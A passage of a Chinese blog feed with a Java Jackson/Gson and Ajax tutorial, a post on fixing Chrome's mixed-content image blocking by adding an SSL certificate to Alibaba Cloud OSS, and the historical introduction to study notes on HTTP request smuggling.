class="line">        &quot;id&quot;:1,</span><br><span class="line">        &quot;name&quot;:&quot;John&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样也可以用于xml的序列化封装，此处不提。<br>更多类似注解，请参考：<a href="https://www.baeldung.com/jackson-annotations">https://www.baeldung.com/jackson-annotations</a></p><h3 id="8-3-3-Json-字符串转Java对象"><a href="#8-3-3-Json-字符串转Java对象" class="headerlink" title="8.3.3 Json 字符串转Java对象"></a>8.3.3 Json 字符串转Java对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test.v0w;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.*;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.*;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.*;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jackson</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="number">18</span>, <span class="string">&quot;V0WKeep3r&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">        File newFile=  <span class="keyword">new</span> File(<span class="string">&quot;/Users/v0w/Desktop/person.json&quot;</span>);</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="comment">// 是否可以序列化</span></span><br><span class="line">        System.out.println(mapper.canSerialize(Person.class));</span><br><span class="line">        <span class="comment">// Json 写入文件</span></span><br><span class="line">        mapper.writeValue(newFile, person);</span><br><span class="line">        <span class="comment">// pojo -&gt; Json String</span></span><br><span class="line">        String jsonString = mapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="comment">// 从文件反序列化</span></span><br><span class="line">        Person p1 = mapper.readValue(<span class="keyword">new</span> File(<span class="string">&quot;/Users/v0w/Desktop/person.json&quot;</span>), Person.class);</span><br><span class="line">        System.out.println(p1);</span><br><span class="line">        <span class="comment">// 从json串反序列化</span></span><br><span class="line">        Person p2 = mapper.readValue(jsonString, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// json Tree解析 此方式存在多种取数据的方法</span></span><br><span class="line">        JsonNode root = mapper.readTree(newFile);</span><br><span class="line">        System.out.println(root);</span><br><span class="line">        System.out.println(root.get(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">        System.out.println(root.at(<span class="string">&quot;/fullName&quot;</span>));</span><br><span class="line">        System.out.println(root.findValue(<span class="string">&quot;dateOfBirth&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>output：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true</span><br><span class="line">&#123;&quot;fullName&quot;:&quot;V0WKeep3r&quot;,&quot;age&quot;:18,&quot;dateOfBirth&quot;:1609400550595&#125;</span><br><span class="line">Person&#123;age&#x3D;18, fullName&#x3D;&#39;V0WKeep3r&#39;, dateOfBirth&#x3D;Thu Dec 31 15:42:30 CST 2020&#125;</span><br><span class="line">Person&#123;age&#x3D;18, fullName&#x3D;&#39;V0WKeep3r&#39;, dateOfBirth&#x3D;Thu Dec 31 15:42:30 CST 2020&#125;</span><br><span class="line">&#123;&quot;fullName&quot;:&quot;V0WKeep3r&quot;,&quot;age&quot;:18,&quot;dateOfBirth&quot;:1609400550595&#125;</span><br><span class="line">18</span><br><span class="line">&quot;V0WKeep3r&quot;</span><br><span class="line">1609400550595</span><br></pre></td></tr></table></figure><h2 id="8-4-Gson"><a href="#8-4-Gson" class="headerlink" title="8.4 Gson"></a>8.4 Gson</h2><p>Gson是Google开源的一个JSON库，被广泛应用在Android开发中。</p><p>maven pom.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Gson --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.code.gson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>gson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>创建Gson对象</strong><br>Gson提供了两种创建对象的方式：</p><ol><li>直接使用Gson构造方法创建:<code>Gson gson = new Gson();</code></li><li>使用GsonBuilder创建:<code>Gson gson = new GsonBuilder().create();</code></li></ol><p>相比直接使用构造方法，GsonBuilder创建的方式更灵活，因为它支持对Gson的配置。</p><p><strong>将对象转换为JSON</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test.v0w;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.*;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GsonTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="number">18</span>, <span class="string">&quot;V0Wkeep3r&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">        Gson gson = <span class="keyword">new</span> GsonBuilder().create();</span><br><span class="line">        String jsonString = gson.toJson(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Person&gt; accountList = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line">        accountList.add(person);</span><br><span class="line">        System.out.println(gson.toJson(accountList));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;age&quot;:18,&quot;fullName&quot;:&quot;V0Wkeep3r&quot;,&quot;dateOfBirth&quot;:&quot;Dec 31, 2020 4:34:41 PM&quot;&#125;</span><br><span class="line">[&#123;&quot;age&quot;:18,&quot;fullName&quot;:&quot;V0Wkeep3r&quot;,&quot;dateOfBirth&quot;:&quot;Dec 31, 2020 4:34:41 PM&quot;&#125;]</span><br></pre></td></tr></table></figure><p><strong>将JSON转换为对象</strong></p><p>由于Java中的泛型存在类型擦除的问题，所以使用泛型接收JSON解析结果的时候有点特殊。</p><p><strong>普通对象解析</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Test_fromJson</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Gson gson = <span class="keyword">new</span> GsonBuilder().create();</span><br><span class="line">    String JsonString = <span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;fullName\&quot;:\&quot;V0Wkeep3r\&quot;,\&quot;dateOfBirth\&quot;:\&quot;Dec 31, 2020 4:34:41 PM\&quot;&#125;&quot;</span>;</span><br><span class="line">    Person person = gson.fromJson(JsonString, Person.class);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Person&#123;age&#x3D;18, fullName&#x3D;&#39;V0Wkeep3r&#39;, dateOfBirth&#x3D;Thu Dec 31 16:34:41 CST 2020&#125;</span><br></pre></td></tr></table></figure><p><strong>泛型对象解析</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Test_fromJson2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Gson gson = <span class="keyword">new</span> GsonBuilder().create();</span><br><span class="line">    String listJson = <span class="string">&quot;[&#123;\&quot;age\&quot;:18,\&quot;fullName\&quot;:\&quot;V0Wkeep3r\&quot;,\&quot;dateOfBirth\&quot;:\&quot;Dec 31, 2020 4:34:41 PM\&quot;&#125;]&quot;</span>;</span><br><span class="line">    List personList = gson.fromJson(listJson, <span class="keyword">new</span> TypeToken&lt;List&lt;Person&gt;&gt;()&#123;&#125;.getType());  <span class="comment">// new TypeToken&lt;List&lt;Person&gt;&gt;()&#123;&#125;.getType()</span></span><br><span class="line">    System.out.println(<span class="string">&quot;PersonList size = &quot;</span> + personList.size());</span><br><span class="line">    System.out.println(<span class="string">&quot;PersonList content = &quot;</span>+personList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PersonList size &#x3D; 1</span><br><span class="line">PersonList content &#x3D; [Person&#123;age&#x3D;18, fullName&#x3D;&#39;V0Wkeep3r&#39;, dateOfBirth&#x3D;Thu Dec 31 16:34:41 CST 2020&#125;]</span><br></pre></td></tr></table></figure><p><strong>字段复用-@SerializedName注解进行重新命名</strong><br>在开发中有时会对Bean对象进行复用，但可能有几个字段的命名和当前的对象不一致，这样在解析JSON的时候就不能正确赋值。Gson提供了字段复用功能——<code>@SerializedName</code>，可用一个字段接收不同的JSON字段。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; json字符串中手机号的字段为phone或telNumber时都可正确解析</span><br><span class="line">@SerializedName(&quot;phone&quot;)</span><br><span class="line">private String telNumber;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; json字符串中用户名的字段为userName、user_name、uname或u_name时都可正确解析</span><br><span class="line">@SerializedName(value &#x3D; &quot;userName&quot;, alternate &#x3D; &#123;&quot;user_name&quot;, &quot;uname&quot;, &quot;u_name&quot;&#125;)</span><br><span class="line">private String userName;</span><br></pre></td></tr></table></figure><p><strong>Gson配置</strong></p><p>除了以上用法，Gson还提供了丰富的配置选项，包括：空值过滤，字段命名规则，自定义解析器，自定义序列化/反序列化等。</p><p><strong>空值问题</strong></p><p>Gson默认情况下会过滤空值字段，但有时在提交数据给后台时，即便字段为空，也需要传给后台，此时可通过GsonBuilder进行配置。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Test_null</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Gson gson = <span class="keyword">new</span> GsonBuilder().serializeNulls().create();</span><br><span class="line">    Person account = <span class="keyword">new</span> Person(<span class="number">99</span>, <span class="string">&quot;Freeman&quot;</span>);</span><br><span class="line">    System.out.println(gson.toJson(account));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;age&quot;:99,&quot;fullName&quot;:&quot;Freeman&quot;,&quot;dateOfBirth&quot;:null&#125;</span><br></pre></td></tr></table></figure><p>从结果可以看出，dataOfBirth字段被输出了，而前面直接创建Gson转换的时候没有输出dataOfBirth字段。</p><p>reference: <a href="https://juejin.cn/post/6844903765603336206">https://juejin.cn/post/6844903765603336206</a></p><h1 id="0x09-Ajax"><a href="#0x09-Ajax" class="headerlink" title="0x09 Ajax"></a>0x09 Ajax</h1><p>通过AJAX Asynchronous JavaScript And XML 实现异步刷新</p><h2 id="9-1-用途"><a href="#9-1-用途" class="headerlink" title="9.1 用途"></a>9.1 用途</h2><p>在一些需要较为实时响应的情况下使用，比如想检测一个账号是否已经存在。<br>功能：<code>如果提交的用户名是abc就打印存在，否则就可以使用</code><br>想实现这个功能，我们可能需要通过jsp去查或者响应，但是怎么样都不是实时的。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">    pageEncoding=<span class="string">&quot;UTF-8&quot;</span> isELIgnored=<span class="string">&quot;false&quot;</span>%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    String name = request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;abc&quot;</span>.equals(name))</span><br><span class="line">        out.print(<span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;已经存在&lt;/font&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        out.print(<span class="string">&quot;&lt;font color=&#x27;green&#x27;&gt;可以使用&lt;/font&gt;&quot;</span>);</span><br><span class="line">     </span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a href=&quot;https://how2j.cn/study/checkName.jsp?name=abc&quot;&gt;checkName.jsp?name=abc&lt;/a&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=&quot;https://how2j.cn/study/checkName.jsp?name=def&quot;&gt;checkName.jsp?name=def&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>而使用Ajax，可以实时响应这个账号是否存在。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>输入账号 :<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">onkeyup</span>=<span class="string">&quot;check()&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;checkResult&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xmlhttp;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> name = <span class="built_in">document</span>.getElementById(<span class="string">&quot;name&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> url = <span class="string">&quot;https://how2j.cn/study/checkName.jsp?name=&quot;</span>+name;</span></span><br><span class="line"> </span><br><span class="line"><span class="javascript">  xmlhttp =<span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">  xmlhttp.onreadystatechange=checkResult; <span class="comment">//响应函数</span></span></span><br><span class="line"><span class="javascript">  xmlhttp.open(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">true</span>);   <span class="comment">//设置访问的页面</span></span></span><br><span class="line"><span class="javascript">  xmlhttp.send(<span class="literal">null</span>);  <span class="comment">//执行访问</span></span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkResult</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;checkResult&#x27;</span>).innerHTML=xmlhttp.responseText;</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.v0w.top/2020/12/16093203006768.jpg"></p><h2 id="9-2-原理与编写"><a href="#9-2-原理与编写" class="headerlink" title="9.2 原理与编写"></a>9.2 原理与编写</h2><p><img src="https://image.v0w.top/2020/12/16093203639405.jpg" alt="原理图"></p><p><strong>1. 创建XHR对象</strong> XMLHttpRequest<br>XHR对象是一个javascript对象，它可以在用户没有感觉的情况下，就像背后运行的一根小线程一般，悄悄的和服务器进行数据交互<br>AJAX就是通过它做到无刷新效果的。</p><p><strong>2. 设置响应函数</strong><br>XHR对象的作用是和服务器进行交互，所以既会发消息给服务器，也能接受服务器返回的响应。<br>当服务器响应回来的时候，调用怎么处理呢？<br>通过 <code>xmlhttp.onreadystatechange=checkResult</code> 就可以指定用<code>checkResult</code> 函数进行处理。</p><p><strong>3. 设置并发出请求</strong><br>通过open函数设置背后的这个小线程，将要访问的页面url ，在本例中就是<br><code>/study/checkName.jsp</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,url,true);</span><br></pre></td></tr></table></figure><p>通过send函数进行实际的访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlhttp.send(null);</span><br></pre></td></tr></table></figure><p>null表示没有参数，因为参数已经通过”GET” 方式，放在url里了。<br>只有在用”POST”，并且需要发送参数的时候，才会使用到send。<br>类似这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlhttp.send(&quot;user&#x3D;&quot;+username+&quot;&amp;password&#x3D;&quot;+password)</span><br></pre></td></tr></table></figure><p><strong>4. 处理响应信息</strong><br>在checkResult 函数中处理响应</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkResult</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;checkResult&#x27;</span>).innerHTML=xmlhttp.responseText;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>xmlhttp.readyState 4</code> 表示请求已完成<br><code>xmlhttp.status 200</code> 表示响应成功<br><code>xmlhttp.responseText;</code> 用于获取服务端传回来的文本<br><code>document.getElementById(&#39;checkResult&#39;).innerHTML</code> 设置span的内容为服务端传递回来的文本.<br><img src="https://image.v0w.top/2020/12/16093212087142.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-tomcat&quot;&gt;&lt;a href=&quot;#0x01-tomcat&quot; class=&quot;headerlink&quot; title=&quot;0x01 tomcat&quot;&gt;&lt;/a&gt;0x01 tomcat&lt;/h1&gt;&lt;p&gt;tomcat是一个服务器中间件，用于运行java web的服务程序，</summary>
      
    
    
    
    <category term="编程算法" scheme="http://v0w.top/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="Java" scheme="http://v0w.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>踩坑：谷歌Chrome浏览器默认https加载导致图片不显示&amp;如何解决</title>
    <link href="http://v0w.top/2020/12/29/Chrome-MixedContent/"/>
    <id>http://v0w.top/2020/12/29/Chrome-MixedContent/</id>
    <published>2020-12-28T16:00:00.000Z</published>
    <updated>2020-12-30T02:47:51.771Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>自Chrome83版本开始，Chrome浏览器默认阻止混合内容<code>MixContent</code>的下载加载等。（即https网站中的http协议加载的内容）最终导致很多未配置静态资源SSL证书的网站在加载图片等http内容时失败，最终导致图片加载不出来等问题。</p><p>网站管理员可以通过<strong>安装证书</strong>解决问题，用户可以通过<strong>允许浏览器加载不安全内容</strong>的设置或者<strong>更换FireFox等其他浏览器</strong>进行暂时性解决。</p><h1 id="0x01-定位问题"><a href="#0x01-定位问题" class="headerlink" title="0x01 定位问题"></a>0x01 定位问题</h1><p>有师傅私聊我，发现我的博客图片不加载，以为是图床挂了，做了个提醒，感谢师傅的提醒0rz。之后我发现这里的图片确实存在问题，但不是图床问题。</p><p>笔者是使用阿里云的OSS做图床，然后绑定了一个二级域名<code>image.v0w.top</code>，都是可以看到的信息。但是之前没有为这个域名和OSS添加SSL证书。</p><p>通过比较FireFox和Google Chrome的图片加载结果与博客文章的显示效果，不难发现，这里的图片不显示，不是图床的问题，而是Chrome浏览器的渲染问题。<br><img src="https://image.v0w.top/2020/12/16092311192486.jpg" alt="diff"></p><p>具体F12看一下控制台信息：<br><img src="https://image.v0w.top/2020/12/16092311820258.jpg" alt="ChromeConsole"><br>发现Chrome的控制台输出了问题原因是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mixed Content: The page at &#39;https:&#x2F;&#x2F;v0w.top&#x2F;2020&#x2F;12&#x2F;20&#x2F;HTTPsmuggling&#x2F;#2-1-4-Bad-Chunked-Transmission&#39; was loaded over HTTPS, but requested an insecure element &#39;http:&#x2F;&#x2F;image.v0w.top&#x2F;2020&#x2F;12&#x2F;httpsmuggling.jpeg&#39;. This request was automatically upgraded to HTTPS, For more information see https:&#x2F;&#x2F;blog.chromium.org&#x2F;2019&#x2F;10&#x2F;no-more-mixed-messages-about-https.html</span><br></pre></td></tr></table></figure><p>简单说就是网站用的https访问，图片却是使用http加载的。于是这里Chrome会做一件事：自动将http加载的数据升格成https进行加载，但是我们知道如果没有配置证书，使用https是没法加载图片的。于是出现了Console中一堆的红色报错<code>Failed to load resource: net::ERR_CERT_COMMON_NAME_INVALI</code>,即<code>资源加载失败，证书错误</code>。<br>于是最终导致了图片显示不了的问题。</p><p>我去查了一点资料，发现该问题是自Chrome版本81开始对混合内容进行警告，83开始阻止混合内容的加载和下载。个人认为谷歌此举属于好心办坏事了吧，https固然更安全，但是对每个资源站都配置SSL证书也是费钱费力啊==、<br>详细看参考以下内容：</p><ul><li><a href="https://bbs.huaweicloud.com/blogs/155829">华为-Chrome将逐步阻止HTTPS页面的HTTP资源下载</a></li><li><a href="https://help.salesforce.com/articleView?id=000355262&language=zh_CN&mode=1&type=1">Google 避免用户在 Google Chrome 中下载不安全的内容</a></li><li><a href="https://blog.chromium.org/2020/02/protecting-users-from-insecure.html">Chromium Blog-Protecting users from insecure downloads in Google Chrome</a></li></ul><p><strong>总之，自Chrome83版本开始，Chrome浏览器默认阻止混合内容<code>MixContent</code>的下载加载等。（即https网站中的http协议加载的内容）最终导致很多未配置静态资源SSL证书的网站在加载图片等http内容时失败，最终导致图片加载不出来等问题。</strong></p><h1 id="0x02-解决问题"><a href="#0x02-解决问题" class="headerlink" title="0x02 解决问题"></a>0x02 解决问题</h1><p>浏览器的此举让用户和网站管理员都很头疼。一方面用户可能正在访问的网站内容存在<code>MixedContent</code>加载不了的问题，不知如何解决；二方面，网站管理者可能因为这种配置不当流失很多的流量。</p><h2 id="2-1-用户如何解决"><a href="#2-1-用户如何解决" class="headerlink" title="2.1 用户如何解决"></a>2.1 用户如何解决</h2><p>用户在遇到一个网站加载不出资源时，如何解决？</p><ol><li><p>最简单的就是更换浏览器，好在其他浏览器暂时没有增加这个默认阻止<code>MixContent</code>的设置，当用户遇到图片加载不了等问题时，可以选择更换浏览器重新访问。</p></li><li><p>Chrome会将MixContent认为是不安全内容，同时Chrome在网站设置中默认时屏蔽不安全内容的，最终导致http内容加载失败。用户可以通过更改设置，允许不安全内容，当然这样也有浏览器被攻击的风险。<br> <img src="https://image.v0w.top/2020/12/16092330714296.jpg"></p><p> <img src="https://image.v0w.top/2020/12/16092330258550.jpg"><br> 此时可以发现图片可以正常加载：<br> <img src="https://image.v0w.top/2020/12/16092331245806.jpg"></p><h2 id="2-2-网站管理员如何解决"><a href="#2-2-网站管理员如何解决" class="headerlink" title="2.2 网站管理员如何解决"></a>2.2 网站管理员如何解决</h2><p>网站管理员可能还是需要申请和配置服务器的SSL证书解决问题。</p></li></ol><p>下面带来阿里云OSS证书申请签发配置。<br>流程如下：<br><strong>1、在阿里云申请签发SSL证书</strong><br><img src="https://image.v0w.top/2020/12/16092333966144.jpg" alt="workflow"><br>由于我是准备用给图床的域名即<code>image.v0w.top</code>申请签发一个证书，且没有其他用处，可以选择单域名的DV证书即可，是免费的。<br><img src="https://image.v0w.top/2020/12/16092335583157.jpg" alt="buy for free"><br>其他的依照提示进行即可，自动签发，签发过程很快，个人体验是大概五到十分钟，签发完成。</p><p>签发完成之后，我们选择后面的其他，会下载一个压缩包，其中包含两个文件<code>*.pem</code>和<code>*.key</code>,分别是SSL证书的公钥和私钥。<br><img src="https://image.v0w.top/2020/12/16092344739514.jpg"></p><p><strong>2、在OSS配置证书</strong><br>接着就是在OSS配置证书，到OSS控制台：<br>选择图床的bucket，传输管理-&gt;证书托管<br><img src="https://image.v0w.top/2020/12/16092345448997.jpg"><br>复制后把pem文本粘贴到公钥，key文本粘贴进私钥。上传即可。</p><p>大概需要15分钟生效，别忘记之后进行测试。<br><img src="https://image.v0w.top/2020/12/16092352588338.jpg" alt="test"></p><p><img src="https://image.v0w.top/2020/12/16092353639824.jpg" alt="博客的资源也加载成功了"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h1&gt;&lt;p&gt;自Chrome83版本开始，Chrome浏览器默认阻止混合内容&lt;code&gt;MixContent&lt;/code&gt;的下载加</summary>
      
    
    
    
    <category term="环境与踩坑" scheme="http://v0w.top/categories/%E7%8E%AF%E5%A2%83%E4%B8%8E%E8%B8%A9%E5%9D%91/"/>
    
    
    <category term="https" scheme="http://v0w.top/tags/https/"/>
    
    <category term="浏览器安全" scheme="http://v0w.top/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私攻击-学习笔记</title>
    <link href="http://v0w.top/2020/12/20/HTTPsmuggling/"/>
    <id>http://v0w.top/2020/12/20/HTTPsmuggling/</id>
    <published>2020-12-19T16:00:00.000Z</published>
    <updated>2020-12-29T08:21:55.520Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p><img src="http://image.v0w.top/2020/12/httpsmuggling.jpeg" alt="HTTP-Smuggling"></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前有听说过这种攻击方式，但是没有详细了解该攻击方式。直到最近遇到的一个漏洞<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12440">CVE-2020-12440</a>，使我不得不面对这样一个话题，而在这个过程中，发现之前错过这个攻击方式还是非常有意思的，于是记录一下我的学习过程，并尝试对<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12440">CVE-2020-12440</a>这个存在于<code>nginx&lt;=1.8.0</code>的漏洞，进行复现。</p><p>本文参考了大量其他师傅的文章，会在具体用到的地方和reference中给出链接，这些师傅的总结都很值得一读，强烈推荐。<br>本文在总结师傅们的文章和经验的同时，会补充CVE-2020-12440的复现分析，补充在平时测试过程中，我们如何利用工具提高该漏洞的检测效率。</p><h1 id="0x01-LifeLine"><a href="#0x01-LifeLine" class="headerlink" title="0x01 LifeLine"></a>0x01 LifeLine</h1><blockquote><p>最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。</p></blockquote><blockquote><p><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></p></blockquote><blockquote><p>在2016年的DEFCON 24 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。</p></blockquote><blockquote><p><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf</a></p></blockquote><blockquote><p>在2019年的BlackHat USA 2019上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。</p></blockquote><blockquote><p><a href="https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153">https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153</a></p></blockquote><h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" 